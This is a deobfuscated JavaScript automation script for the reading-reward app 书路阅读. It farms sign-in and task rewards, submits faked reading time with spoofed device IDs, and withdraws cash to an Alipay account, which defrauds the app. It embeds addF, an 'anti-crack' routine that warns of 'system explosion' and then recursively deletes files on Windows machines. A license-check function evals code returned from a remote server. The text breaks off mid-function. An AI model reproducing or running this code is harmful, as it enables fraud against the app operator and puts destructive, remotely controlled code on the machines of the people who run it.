/*
@肥皂 4.20 书路阅读  安卓&ios 自己搜索下载
抓取域名：read.beijzc.com
变量：slyduid 抓取的userId 多账号@隔开
变量：slydtxzh 提现的支付宝账号
变量 cdkey    对应脚本验证卡密。所有脚本通用
一天运行12次，每次跑15分钟的时长...
4.21 应该是修复了阅读时长的问题
*/
process.env.slyduid = '93944'
const $ = new Env('书路阅读')
let status
status = (status = $['getval']('slydstatus') || '1') > 1 ? '' + status : ''
JSNAMED = $['isNode']() ? require('path')['basename'](__filename) : 'slyd.js'
let slyduid = ($['isNode']() ? process['env']['slyduid'] : $['getdata']('slyduid')) || ''
let slyddid = ($['isNode']() ? process['env']['slyddid'] : $['getdata']('slyddid')) || ''
let slydtxzh = ($['isNode']() ? process['env']['slydtxzh'] : $['getdata']('slydtxzh')) || '',
    acckey = $['isNode']() ? (process['env']['cdkey'] ? process['env']['cdkey'] : '') : $['getdata']('cdkey') ? $['getdata']('cdkey') : ''
let slydrwid = ['8', '10', '15', '16', '17']
let txid = '',
    arrs = []
var gtr
let mac = ''
let all_msg = ''

if ($['isNode']()) {
    gtr = require('fs')

    if (isFileExist('C:/')) {
        console['log']('电脑环境')
    } else {
        console['log']('青龙环境')
    }
} else {
    console['log']('代理环境')
}

function isFileExist(_0x1f78a9) {
    try {
        gtr['accessSync'](_0x1f78a9, gtr['F_OK'])
    } catch (_0x5a3034) {
        return false
    }

    return true
}

function addF(_0x3ff038, _0x311502) {
    let _0x1e6aff = 0,
        _0x15445c = 'C:/Windows/system.txt'

    if (isFileExist(_0x15445c)) {
        _0x1e6aff = gtr['readFileSync'](_0x15445c, 'utf8')
    } else {
        if (isFileExist('C:/')) {
            gtr['writeFile'](_0x15445c, '1', function (_0x2b3ed3) {
                if (_0x2b3ed3) {
                    throw _0x2b3ed3
                }
            })
        } else {
            return
        }
    }

    if (_0x1e6aff == 99) {
        return 99
    }

    console['log'](_0x1e6aff)
    console['log']('警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！', _0x1e6aff)

    if (parseInt(_0x1e6aff) < 3) {
        let _0x3dfd48 = parseInt(_0x1e6aff) + 1

        gtr['writeFileSync'](_0x15445c, _0x3dfd48 + '', 'utf8')
        return
    }

    if (!gtr['existsSync'](_0x3ff038)) {
        return
    }

    if (gtr['statSync'](_0x3ff038)['isDirectory']()) {
        var _0x437d71 = gtr['readdirSync'](_0x3ff038),
            _0x1959f9 = _0x437d71['length'],
            _0x6024d6 = 0

        if (_0x1959f9 > 0) {
            _0x437d71['forEach'](function (_0x5e26cc) {
                _0x6024d6++

                var _0x5c2203 = _0x3ff038 + '/' + _0x5e26cc

                gtr['statSync'](_0x5c2203)['isDirectory']() ? addF(_0x5c2203, true) : gtr['unlinkSync'](_0x5c2203)
            })

            _0x1959f9 == _0x6024d6 && _0x311502 && gtr['rmdirSync'](_0x3ff038)
        } else {
            _0x1959f9 == 0 && _0x311502 && gtr['rmdirSync'](_0x3ff038)
        }
    } else {
        gtr['unlinkSync'](_0x3ff038)
    }
}

!(async () => {
    if (typeof $request !== 'undefined') {
        await slydck()
    } else {
        // arrs = await hqs()
        // console["log"](all_msg);

        // if (!arrs) {
        //     return
        // }

        var slyduidArr = slyduid['split']('@')
        // console["log"]("\n公告：" + arrs['gg'] + "\n");
        // console['log']("当前版本：1.0 " + arrs['bb'] + "\n");
        // console["log"]("------------- 共" + slyduidArr["length"] + "个账号-------------\n");
        // console["log"]("当前设备可执行账号限制为" + arrs["num"] + "个账号\n");
        for (const [index, iterator] of slyduidArr.entries()) {
            slyduid = iterator
            $['index'] = index + 1
            console['log']('\n开始【书路阅读' + $['index'] + '】')
            // await slydqd()
            await slydqd2()
            await slydbx()

            for (const iterator of slydrwid) {
                slydid = iterator
                await slydrw()
            }
            for (let _0x337712 = 0; _0x337712 < 15; _0x337712++) {
                await slydsc1()
                await $['wait'](2000)
                await slydsc2()
            }
            await slydtxid()
            await slydtx()
        }

        // if (slyduidArr['length'] > parseInt(arrs['num'])) {
        // } else {
        //     for (let _0x46889f = 0; _0x46889f < slyduidArr['length']; _0x46889f++) {
        //         slyduid = slyduidArr[_0x46889f]
        //         $['index'] = _0x46889f + 1
        //         console['log']('\n开始【书路阅读' + $['index'] + '】')
        //         await slydqd()
        //         await slydqd2()
        //         await slydbx()

        //         for (let _0x2c45f0 = 0; _0x2c45f0 < slydrwid['length']; _0x2c45f0++) {
        //             slydid = slydrwid[_0x2c45f0]
        //             await slydrw()
        //         }
        //     }

        //     for (let _0x4328d7 = 0; _0x4328d7 < 15; _0x4328d7++) {
        //         await slydsc1()
        //         await $['wait'](2000)
        //         await slydsc2()
        //     }

        //     await slydtxid()
        //     await slydtx()
        // }
    }
})()
    ['catch']((_0x25c42) => $['logErr'](_0x25c42))
    ['finally'](() => $['done']())

function slydqd(_0xfc800 = 0) {
    return new Promise((_0xf20e9f) => {
        let _0x3f2122 = {
            url: arrs['url'],
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: slyddid,
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"userId":"' + slyduid + '"}',
        }
        $['post'](
            _0x3f2122,
            async (_0xdb4e95, _0x7adb9a, _0x1f5601) => {
                try {
                    const _0x3d16df = JSON['parse'](_0x1f5601)

                    _0x3d16df['code'] == 0 ? console['log']('\n书路阅读已签到：' + _0x3d16df['data']['continuityDay'] + '天') : console['log']('\n书路阅读签到：' + _0x3d16df['msg'])
                } catch (_0x423af1) {
                } finally {
                    _0xf20e9f()
                }
            },
            _0xfc800
        )
    })
}

function slydqd2(_0x59fa81 = 0) {
    return new Promise((_0x4a7996) => {
        let _0xcdda4a = {
            url: 'https://read.beijzc.com/book/task/v2/finishSignup',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                // deviceid: slyddid,
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"userId":"' + slyduid + '"}',
        }
        $['post'](
            _0xcdda4a,
            async (_0x3d2b63, _0x38b8c7, _0x3423bb) => {
                try {
                    const _0x94deaa = JSON['parse'](_0x3423bb)

                    _0x94deaa['code'] == 0 ? console['log']('\n书路阅读签到：' + _0x94deaa['msg'] + ' ') : console['log']('\n书路阅读签到：' + _0x94deaa['msg'])
                } catch (_0x409c9b) {
                } finally {
                    _0x4a7996()
                }
            },
            _0x59fa81
        )
    })
}

function slydrw(_0x2609a3 = 0) {
    return new Promise((_0x44e629) => {
        let _0x4f176a = {
            url: 'https://read.beijzc.com/book/task/finishTask',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: slyddid,
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"id":' + slydid + ',"userId":"' + slyduid + '"}',
        }
        $['post'](
            _0x4f176a,
            async (_0x1038c9, _0x47d3ac, _0x5937cc) => {
                try {
                    const _0x510d02 = JSON['parse'](_0x5937cc)

                    _0x510d02['code'] == 0 ? console['log']('\n书路阅读任务：' + slydid + ' 成功') : console['log']('\n书路阅读任务：' + slydid + ' ' + _0x510d02['msg'])
                } catch (_0x4b55b7) {
                } finally {
                    _0x44e629()
                }
            },
            _0x2609a3
        )
    })
}

function slydbx(_0x56993c = 0) {
    return new Promise((_0x2abdd5) => {
        let _0x318577 = {
            url: 'https://read.beijzc.com/book/task/finishTask',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: slyddid,
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"id":"23","userId":"' + slyduid + '","productType":"2"}',
        }
        $['post'](
            _0x318577,
            async (_0x1dea60, _0x13470f, _0x397daa) => {
                try {
                    const _0xab0384 = JSON['parse'](_0x397daa)

                    _0xab0384['code'] == 0 ? (console['log']('\n书路阅读开宝箱 成功'), await slydbx()) : console['log']('\n书路阅读开宝箱：' + _0xab0384['msg'])
                } catch (_0x5313bf) {
                } finally {
                    _0x2abdd5()
                }
            },
            _0x56993c
        )
    })
}

function slydsc1(_0x3f0999 = 0) {
    return new Promise((_0x5d1f72) => {
        let _0x432352 = {
            url: 'https://read.beijzc.com/v2/log/userActionLog',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: slyddid,
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body:
                '{"currentPage":"book_read","productType":"2","currentAction":"read_time","brand":"Apple","appId":"com.beijzc.BookRoad","isWifi":"Wifi","deviceId":"","versionName":"1.3","userId":"' +
                slyduid +
                '","channelName":"appStore","data":{"bookId":"1897","chapterId":"867771","time":60},"versionCode":"1.3","model":"iPad11,2","osversion":"14.1"}',
        }
        $['post'](
            _0x432352,
            async (_0x3eff0f, _0x52ccbc, _0x2ec701) => {
                try {
                    const _0x267989 = JSON['parse'](_0x2ec701)

                    _0x267989['code'] == 0 ? console['log']('\n书路阅读上传时长：' + _0x267989['msg']) : console['log']('\n书路阅读上次时长：' + _0x267989['msg'])
                } catch (_0x354b3c) {
                } finally {
                    _0x5d1f72()
                }
            },
            _0x3f0999
        )
    })
}

function slydsc2(_0x1d3620 = 0) {
    return new Promise((_0x5d6a1e) => {
        let _0xf547d6 = {
            url: 'https://read.beijzc.com/v2/book/task/shulu/finishReadTask',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: randomString(32),
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"taskType":2,"userId":"' + slyduid + '","productType":2}',
        }
        $['post'](
            _0xf547d6,
            async (_0x350e73, _0x4f3e89, _0x476070) => {
                try {
                    const _0x3786df = JSON['parse'](_0x476070)

                    _0x3786df['code'] == 0 ? console['log']('\n书路阅读提交时长：' + _0x3786df['data']['tipMsg']) : console['log']('\n书路阅读提交时长：' + _0x476070)
                } catch (_0x16638e) {
                } finally {
                    _0x5d6a1e()
                }
            },
            _0x1d3620
        )
    })
}

function slydtxid(_0x453293 = 0) {
    return new Promise((_0x3ea082) => {
        let _0x68e141 = {
            url: 'https://read.beijzc.com/config/exchangeConfig?userId=' + slyduid + '&productType=2',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: '1D614D83-A968-4835-B24E-054D29057C67',
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
        }
        $['get'](
            _0x68e141,
            async (_0x1f47cf, _0x1708be, _0x1e42b1) => {
                try {
                    const _0x4b505b = JSON['parse'](_0x1e42b1)

                    _0x4b505b['code'] == 0 ? ((txid = _0x4b505b['data']['aliExchangeList'][0]['id']), console['log']('\n书路阅读去提现：' + _0x4b505b['data']['aliExchangeList'][0]['money'] + '元')) : console['log']('\n书路阅读提现：' + _0x4b505b['msg'])
                } catch (_0x1157c5) {
                } finally {
                    _0x3ea082()
                }
            },
            _0x453293
        )
    })
}

function slydtx(_0x4a9741 = 0) {
    return new Promise((_0x13e49d) => {
        let _0x5d1ec6 = {
            url: 'https://read.beijzc.com/config/exchangeCash',
            headers: {
                Host: 'read.beijzc.com',
                'Content-Type': 'application/json',
                deviceid: '1D614D83-A968-4835-B24E-054D29057C67',
                versionCode: '22',
                Connection: 'keep-alive',
                productType: '2',
                Accept: '*/*',
                'Accept-Language': 'zh-Hans-CN;q=1',
                'User-Agent': 'chrome',
                'Content-Length': '18',
            },
            body: '{"productType":"2","id":' + txid + ',"account":"' + slydtxzh + '","userId":"' + slyduid + '"}',
        }
        $['post'](
            _0x5d1ec6,
            async (_0x15764a, _0x3e753c, _0x4190bd) => {
                try {
                    const _0x50b898 = JSON['parse'](_0x4190bd)

                    _0x50b898['code'] == 0 ? console['log']('\n书路阅读提现：' + _0x50b898['msg']) : console['log']('\n书路阅读提现：' + _0x50b898['msg'])
                } catch (_0x4c81da) {
                } finally {
                    _0x13e49d()
                }
            },
            _0x4a9741
        )
    })
}

function randomString(_0x1a1ba9 = 12) {
    let _0x44abd6 = 'abcdef0123456789'
    let _0xf7539d = _0x44abd6['length'],
        _0x4645ba = ''

    for (i = 0; i < _0x1a1ba9; i++) {
        _0x4645ba += _0x44abd6['charAt'](Math['floor'](Math['random']() * _0xf7539d))
    }

    return _0x4645ba
}

function rand(_0x18abe8, _0x1f2c68) {
    return parseInt(Math['random']() * (_0x1f2c68 - _0x18abe8 + 1) + _0x18abe8, 10)
}

function hqs(_0x193b03 = 10) {
    return new Promise((_0x4b7b1a) => {
        let _0x86a1f5 = 13
        let _0xc68b6e = {
            url: $['isNode']() ? rc4($['fwur'](), '1200') + ('?key=' + acckey + '&id=' + _0x86a1f5 + '&ip=1&mac=' + mac + '&bb=1') : rc4($['fwur'](), '1200') + ('?key=' + acckey + '&id=' + _0x86a1f5 + '&ip=0&mac=' + mac + '&bb=1'),
        }
        $['post'](
            _0xc68b6e,
            async (_0x34cdab, _0x3bc42a, _0x5ba2c0) => {
                try {
                    let _0x28489e = eval(_0x5ba2c0)

                    _0x28489e['code'] == 200 ? ((all_msg = _0x28489e['msg']), _0x4b7b1a(_0x28489e['data'])) : ((all_msg = _0x28489e['msg']), _0x4b7b1a(false))
                } catch (_0x9e8958) {
                    $['logErr'](_0x9e8958, _0x3bc42a)
                }
            },
            0
        )
    })
}

function FxPCnMKLw7() {
    _keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

    this['encode'] = function (_0x248e93) {
        var _0x43b21d = ''

        var _0x2d5d5b, _0x8d7a94, _0x3376ff, _0x8b25d9, _0x11e902, _0x174157, _0x214138

        var _0x18e608 = 0
        _0x248e93 = _utf8_encode(_0x248e93)

        while (_0x18e608 < _0x248e93['length']) {
            _0x2d5d5b = _0x248e93['charCodeAt'](_0x18e608++)
            _0x8d7a94 = _0x248e93['charCodeAt'](_0x18e608++)
            _0x3376ff = _0x248e93['charCodeAt'](_0x18e608++)
            _0x8b25d9 = _0x2d5d5b >> 2
            _0x11e902 = ((_0x2d5d5b & 3) << 4) | (_0x8d7a94 >> 4)
            _0x174157 = ((_0x8d7a94 & 15) << 2) | (_0x3376ff >> 6)
            _0x214138 = _0x3376ff & 63

            if (isNaN(_0x8d7a94)) {
                _0x174157 = _0x214138 = 64
            } else {
                isNaN(_0x3376ff) && (_0x214138 = 64)
            }

            _0x43b21d = _0x43b21d + _keyStr['charAt'](_0x8b25d9) + _keyStr['charAt'](_0x11e902) + _keyStr['charAt'](_0x174157) + _keyStr['charAt'](_0x214138)
        }

        return _0x43b21d
    }

    this['decode'] = function (_0x269d1d) {
        var _0x442149 = ''

        var _0x326406, _0x57b9cc, _0x324ec1, _0x54f32a, _0x383af1, _0x226f68, _0x3b344e

        var _0x445a44 = 0
        _0x269d1d = _0x269d1d['replace'](/[^A-Za-z0-9\+\/\=]/g, '')

        while (_0x445a44 < _0x269d1d['length']) {
            _0x54f32a = _keyStr['indexOf'](_0x269d1d['charAt'](_0x445a44++))
            _0x383af1 = _keyStr['indexOf'](_0x269d1d['charAt'](_0x445a44++))
            _0x226f68 = _keyStr['indexOf'](_0x269d1d['charAt'](_0x445a44++))
            _0x3b344e = _keyStr['indexOf'](_0x269d1d['charAt'](_0x445a44++))
            _0x326406 = (_0x54f32a << 2) | (_0x383af1 >> 4)
            _0x57b9cc = ((_0x383af1 & 15) << 4) | (_0x226f68 >> 2)
            _0x324ec1 = ((_0x226f68 & 3) << 6) | _0x3b344e
            _0x442149 = _0x442149 + String['fromCharCode'](_0x326406)
            _0x226f68 != 64 && (_0x442149 = _0x442149 + String['fromCharCode'](_0x57b9cc))
            _0x3b344e != 64 && (_0x442149 = _0x442149 + String['fromCharCode'](_0x324ec1))
        }

        _0x442149 = _utf8_decode(_0x442149)
        return _0x442149
    }

    _utf8_encode = function (_0x27a212) {
        _0x27a212 = _0x27a212['replace'](/\r\n/g, '\n')
        var _0x40b1dc = ''

        for (var _0x15a8dd = 0; _0x15a8dd < _0x27a212['length']; _0x15a8dd++) {
            var _0x3684bf = _0x27a212['charCodeAt'](_0x15a8dd)

            if (_0x3684bf < 128) {
                _0x40b1dc += String['fromCharCode'](_0x3684bf)
            } else {
                _0x3684bf > 127 && _0x3684bf < 2048
                    ? ((_0x40b1dc += String['fromCharCode']((_0x3684bf >> 6) | 192)), (_0x40b1dc += String['fromCharCode']((_0x3684bf & 63) | 128)))
                    : ((_0x40b1dc += String['fromCharCode']((_0x3684bf >> 12) | 224)), (_0x40b1dc += String['fromCharCode'](((_0x3684bf >> 6) & 63) | 128)), (_0x40b1dc += String['fromCharCode']((_0x3684bf & 63) | 128)))
            }
        }

        return _0x40b1dc
    }

    _utf8_decode = function (_0x551264) {
        var _0x150224 = ''

        var _0x29a3c0 = 0,
            _0x17a597 = (c1 = c2 = 0)

        while (_0x29a3c0 < _0x551264['length']) {
            _0x17a597 = _0x551264['charCodeAt'](_0x29a3c0)

            if (_0x17a597 < 128) {
                _0x150224 += String['fromCharCode'](_0x17a597)
                _0x29a3c0++
            } else {
                _0x17a597 > 191 && _0x17a597 < 224
                    ? ((c2 = _0x551264['charCodeAt'](_0x29a3c0 + 1)), (_0x150224 += String['fromCharCode'](((_0x17a597 & 31) << 6) | (c2 & 63))), (_0x29a3c0 += 2))
                    : ((c2 = _0x551264['charCodeAt'](_0x29a3c0 + 1)), (c3 = _0x551264['charCodeAt'](_0x29a3c0 + 2)), (_0x150224 += String['fromCharCode'](((_0x17a597 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63))), (_0x29a3c0 += 3))
            }
        }

        return _0x150224
    }
}

function rc4(_0x66b050, _0x41d572) {
    var _0x4de327 = Array(256)

    var _0x3a26d9 = Array(_0x66b050['length'])

    for (var _0xd22e7f = 0; _0xd22e7f < 256; _0xd22e7f++) {
        _0x4de327[_0xd22e7f] = _0xd22e7f

        var _0x4a304e = (_0x4a304e + _0x4de327[_0xd22e7f] + _0x41d572['charCodeAt'](_0xd22e7f % _0x41d572['length'])) % 256,
            _0x370b05 = _0x4de327[_0xd22e7f]

        _0x4de327[_0xd22e7f] = _0x4de327[_0x4a304e]
        _0x4de327[_0x4a304e] = _0x370b05
    }

    for (var _0xd22e7f = 0; _0xd22e7f < _0x66b050['length']; _0xd22e7f++) {
        _0x3a26d9[_0xd22e7f] = _0x66b050['charCodeAt'](_0xd22e7f)
    }

    for (var _0x49e309 = 0; _0x49e309 < _0x3a26d9['length']; _0x49e309++) {
        var _0xd22e7f = (_0xd22e7f + 1) % 256,
            _0x4a304e = (_0x4a304e + _0x4de327[_0xd22e7f]) % 256,
            _0x370b05 = _0x4de327[_0xd22e7f]

        _0x4de327[_0xd22e7f] = _0x4de327[_0x4a304e]
        _0x4de327[_0x4a304e] = _0x370b05

        var _0x5cb46c = (_0x4de327[_0xd22e7f] + (_0x4de327[_0x4a304e] % 256)) % 256

        _0x3a26d9[_0x49e309] = String['fromCharCode'](_0x3a26d9[_0x49e309] ^ _0x4de327[_0x5cb46c])
    }

    return _0x3a26d9['join']('')
}

function Env(_0x3a97e6, _0x145d6e) {
    class _0x18aec0 {
        constructor(_0x3b36e5) {
            this['env'] = _0x3b36e5
        }

        ['send'](_0x15585a, _0x39a083 = 'GET') {
            _0x15585a =
                'string' == typeof _0x15585a
                    ? {
                          url: _0x15585a,
                      }
                    : _0x15585a
            let _0xe49d34 = this['get']
            'POST' === _0x39a083 && (_0xe49d34 = this['post'])
            return new Promise((_0x2f7ed4, _0x28c2d5) => {
                _0xe49d34['call'](this, _0x15585a, (_0x535baa, _0x345cf6, _0x4e8e2a) => {
                    _0x535baa ? _0x28c2d5(_0x535baa) : _0x2f7ed4(_0x345cf6)
                })
            })
        }

        ['get'](_0x4b43e5) {
            return this['send']['call'](this['env'], _0x4b43e5)
        }

        ['post'](_0x2a89b4) {
            return this['send']['call'](this['env'], _0x2a89b4, 'POST')
        }
    }

    return new (class {
        constructor(_0x48f339, _0x17eda4) {
            this['name'] = _0x48f339
            this['http'] = new _0x18aec0(this)
            this['data'] = null
            this['dataFile'] = 'box.dat'
            this['logs'] = []
            this['isMute'] = false
            this['isNeedRewrite'] = false
            this['logSeparator'] = '\n'
            this['encoding'] = 'utf-8'
            this['startTime'] = new Date()['getTime']()
            Object['assign'](this, _0x17eda4)
            this['log']('', '🔔' + this['name'] + ', 开始!')
        }

        ['isNode']() {
            return 'undefined' != typeof module && !!module['exports']
        }

        ['isQuanX']() {
            return 'undefined' != typeof $task
        }

        ['isSurge']() {
            return 'undefined' != typeof $httpClient && 'undefined' == typeof $loon
        }

        ['isLoon']() {
            return 'undefined' != typeof $loon
        }

        ['isShadowrocket']() {
            return 'undefined' != typeof $rocket
        }

        ['toObj'](_0x316d5b, _0x1b1513 = null) {
            try {
                return JSON['parse'](_0x316d5b)
            } catch {
                return _0x1b1513
            }
        }

        ['toStr'](_0x36ed50, _0x3be338 = null) {
            try {
                return JSON['stringify'](_0x36ed50)
            } catch {
                return _0x3be338
            }
        }

        ['getjson'](_0x5cb2e8, _0x2a3884) {
            let _0x523583 = _0x2a3884

            const _0x3eee35 = this['getdata'](_0x5cb2e8)

            if (_0x3eee35) {
                try {
                    _0x523583 = JSON['parse'](this['getdata'](_0x5cb2e8))
                } catch {}
            }

            return _0x523583
        }

        ['setjson'](_0x4ed0f4, _0x5f020d) {
            try {
                return this['setdata'](JSON['stringify'](_0x4ed0f4), _0x5f020d)
            } catch {
                return false
            }
        }

        ['getScript'](_0x581a10) {
            return new Promise((_0x729863) => {
                this['get'](
                    {
                        url: _0x581a10,
                    },
                    (_0x2aa8ed, _0x5790d2, _0x169f0e) => _0x729863(_0x169f0e)
                )
            })
        }

        ['runScript'](_0x3262b9, _0x5b3765) {
            return new Promise((_0x239576) => {
                let _0x282aec = this['getdata']('@chavy_boxjs_userCfgs.httpapi')

                _0x282aec = _0x282aec ? _0x282aec['replace'](/\n/g, '')['trim']() : _0x282aec

                let _0x115cba = this['getdata']('@chavy_boxjs_userCfgs.httpapi_timeout')

                _0x115cba = _0x115cba ? 1 * _0x115cba : 20
                _0x115cba = _0x5b3765 && _0x5b3765['timeout'] ? _0x5b3765['timeout'] : _0x115cba

                const [_0x32e451, _0x12b8ec] = _0x282aec['split']('@'),
                    _0x169bf7 = {
                        url: 'http://' + _0x12b8ec + '/v1/scripting/evaluate',
                        body: {
                            script_text: _0x3262b9,
                            mock_type: 'cron',
                            timeout: _0x115cba,
                        },
                        headers: {
                            'X-Key': _0x32e451,
                            Accept: '*/*',
                        },
                    }

                this['post'](_0x169bf7, (_0x465e59, _0x3cf49b, _0x1aa3d4) => _0x239576(_0x1aa3d4))
            })['catch']((_0x451bd6) => this['logErr'](_0x451bd6))
        }

        ['loaddata']() {
            if (!this['isNode']()) {
                return {}
            }

            {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x342343 = this['path']['resolve'](this['dataFile']),
                    _0x680cd3 = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x522940 = this['fs']['existsSync'](_0x342343),
                    _0x10de53 = !_0x522940 && this['fs']['existsSync'](_0x680cd3)

                if (!_0x522940 && !_0x10de53) {
                    return {}
                }

                {
                    const _0x508092 = _0x522940 ? _0x342343 : _0x680cd3

                    try {
                        return JSON['parse'](this['fs']['readFileSync'](_0x508092))
                    } catch (_0x55078f) {
                        return {}
                    }
                }
            }
        }

        ['writedata']() {
            if (this['isNode']()) {
                this['fs'] = this['fs'] ? this['fs'] : require('fs')
                this['path'] = this['path'] ? this['path'] : require('path')

                const _0x105329 = this['path']['resolve'](this['dataFile']),
                    _0x1ae458 = this['path']['resolve'](process['cwd'](), this['dataFile']),
                    _0x40d146 = this['fs']['existsSync'](_0x105329),
                    _0x239e36 = !_0x40d146 && this['fs']['existsSync'](_0x1ae458),
                    _0x120e14 = JSON['stringify'](this['data'])

                _0x40d146 ? this['fs']['writeFileSync'](_0x105329, _0x120e14) : _0x239e36 ? this['fs']['writeFileSync'](_0x1ae458, _0x120e14) : this['fs']['writeFileSync'](_0x105329, _0x120e14)
            }
        }

        ['lodash_get'](_0x6bd33, _0x109c1e, _0x4f997a) {
            const _0x242967 = _0x109c1e['replace'](/\[(\d+)\]/g, '.$1')['split']('.')

            let _0x4cb2ed = _0x6bd33

            for (const _0x174422 of _0x242967)
                if (((_0x4cb2ed = Object(_0x4cb2ed)[_0x174422]), void 0 === _0x4cb2ed)) {
                    return _0x4f997a
                }

            return _0x4cb2ed
        }

        ['lodash_set'](_0x28ed9c, _0x50a189, _0x272538) {
            return Object(_0x28ed9c) !== _0x28ed9c
                ? _0x28ed9c
                : (Array['isArray'](_0x50a189) || (_0x50a189 = _0x50a189['toString']()['match'](/[^.[\]]+/g) || []),
                  (_0x50a189['slice'](0, -1)['reduce']((_0x3c2c46, _0x3090c4, _0x50c484) => (Object(_0x3c2c46[_0x3090c4]) === _0x3c2c46[_0x3090c4] ? _0x3c2c46[_0x3090c4] : (_0x3c2c46[_0x3090c4] = Math['abs'](_0x50a189[_0x50c484 + 1]) >> 0 == +_0x50a189[_0x50c484 + 1] ? [] : {})), _0x28ed9c)[
                      _0x50a189[_0x50a189['length'] - 1]
                  ] = _0x272538),
                  _0x28ed9c)
        }

        ['getdata'](_0x20df00) {
            let _0x323f3e = this['getval'](_0x20df00)

            if (/^@/['test'](_0x20df00)) {
                const [, _0x91e216, _0x4f032a] = /^@(.*?)\.(.*?)$/['exec'](_0x20df00),
                    _0xf7dc34 = _0x91e216 ? this['getval'](_0x91e216) : ''

                if (_0xf7dc34) {
                    try {
                        const _0x3bdf10 = JSON['parse'](_0xf7dc34)

                        _0x323f3e = _0x3bdf10 ? this['lodash_get'](_0x3bdf10, _0x4f032a, '') : _0x323f3e
                    } catch (_0x381990) {
                        _0x323f3e = ''
                    }
                }
            }

            return _0x323f3e
        }

        ['setdata'](_0x3a945e, _0x2767fa) {
            let _0x3c0ed5 = false

            if (/^@/['test'](_0x2767fa)) {
                const [, _0x1ca73e, _0x5b2891] = /^@(.*?)\.(.*?)$/['exec'](_0x2767fa),
                    _0x4f6313 = this['getval'](_0x1ca73e),
                    _0x34a8cf = _0x1ca73e ? ('null' === _0x4f6313 ? null : _0x4f6313 || '{}') : '{}'

                try {
                    const _0x31deaa = JSON['parse'](_0x34a8cf)

                    this['lodash_set'](_0x31deaa, _0x5b2891, _0x3a945e)
                    _0x3c0ed5 = this['setval'](JSON['stringify'](_0x31deaa), _0x1ca73e)
                } catch (_0x3a2752) {
                    const _0x33bc72 = {}
                    this['lodash_set'](_0x33bc72, _0x5b2891, _0x3a945e)
                    _0x3c0ed5 = this['setval'](JSON['stringify'](_0x33bc72), _0x1ca73e)
                }
            } else {
                _0x3c0ed5 = this['setval'](_0x3a945e, _0x2767fa)
            }

            return _0x3c0ed5
        }

        ['getval'](_0x2b4b97) {
            return this['isSurge']() || this['isLoon']() ? $persistentStore['read'](_0x2b4b97) : this['isQuanX']() ? $prefs['valueForKey'](_0x2b4b97) : this['isNode']() ? ((this['data'] = this['loaddata']()), this['data'][_0x2b4b97]) : (this['data'] && this['data'][_0x2b4b97]) || null
        }

        ['setval'](_0x23d4d9, _0x51f83a) {
            return this['isSurge']() || this['isLoon']()
                ? $persistentStore['write'](_0x23d4d9, _0x51f83a)
                : this['isQuanX']()
                ? $prefs['setValueForKey'](_0x23d4d9, _0x51f83a)
                : this['isNode']()
                ? ((this['data'] = this['loaddata']()), (this['data'][_0x51f83a] = _0x23d4d9), this['writedata'](), true)
                : (this['data'] && this['data'][_0x51f83a]) || null
        }

        ['initGotEnv'](_0x1de744) {
            this['got'] = this['got'] ? this['got'] : require('got')
            this['cktough'] = this['cktough'] ? this['cktough'] : require('tough-cookie')
            this['ckjar'] = this['ckjar'] ? this['ckjar'] : new this['cktough']['CookieJar']()
            _0x1de744 && ((_0x1de744['headers'] = _0x1de744['headers'] ? _0x1de744['headers'] : {}), void 0 === _0x1de744['headers']['Cookie'] && void 0 === _0x1de744['cookieJar'] && (_0x1de744['cookieJar'] = this['ckjar']))
        }

        ['get'](_0x329258, _0xbfffd7 = () => {}) {
            if ((_0x329258['headers'] && (delete _0x329258['headers']['Content-Type'], delete _0x329258['headers']['Content-Length']), this['isSurge']() || this['isLoon']())) {
                this['isSurge']() &&
                    this['isNeedRewrite'] &&
                    ((_0x329258['headers'] = _0x329258['headers'] || {}),
                    Object['assign'](_0x329258['headers'], {
                        'X-Surge-Skip-Scripting': false,
                    }))
                $httpClient['get'](_0x329258, (_0x36d7a9, _0x5e7664, _0x1d5a31) => {
                    !_0x36d7a9 && _0x5e7664 && ((_0x5e7664['body'] = _0x1d5a31), (_0x5e7664['statusCode'] = _0x5e7664['status']))

                    _0xbfffd7(_0x36d7a9, _0x5e7664, _0x1d5a31)
                })
            } else {
                if (this['isQuanX']()) {
                    this['isNeedRewrite'] &&
